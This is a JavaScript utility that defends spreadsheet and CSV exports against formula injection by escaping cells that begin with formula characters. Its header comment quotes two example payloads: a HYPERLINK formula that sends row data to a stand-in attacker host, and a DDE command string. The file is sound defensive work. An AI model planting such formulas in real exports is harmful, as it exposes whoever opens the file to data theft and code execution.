// beacon2026/backend/src/utils/spreadsheet.js
// Defence against CSV / spreadsheet formula injection.
//
// Excel, LibreOffice Calc, and Google Sheets execute the contents of any
// cell whose first character is one of =, +, -, @, tab, or CR as a formula
// when the file is opened. A member with a surname of
//   =HYPERLINK("http://attacker/?c="&A2,"click")
// would otherwise quietly exfiltrate the row when an admin opens the daily
// backup, and =cmd|'/c calc'!A0 still triggers DDE execution on older Excel.
//
// Prefixing the value with a single quote ('') tells the spreadsheet to
// treat the cell as a literal text value; the leading quote is stripped on
// display, so the admin never sees the difference.

const FORMULA_PREFIX = /^[=+\-@\t\r]/;

export function sanitizeCell(value) {
  if (typeof value !== 'string') return value;
  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
}

export function sanitizeRowForExport(row) {
  if (!row || typeof row !== 'object') return row;
  const out = Array.isArray(row) ? [] : {};
  for (const [k, v] of Object.entries(row)) {
    out[k] = sanitizeCell(v);
  }
  return out;
}
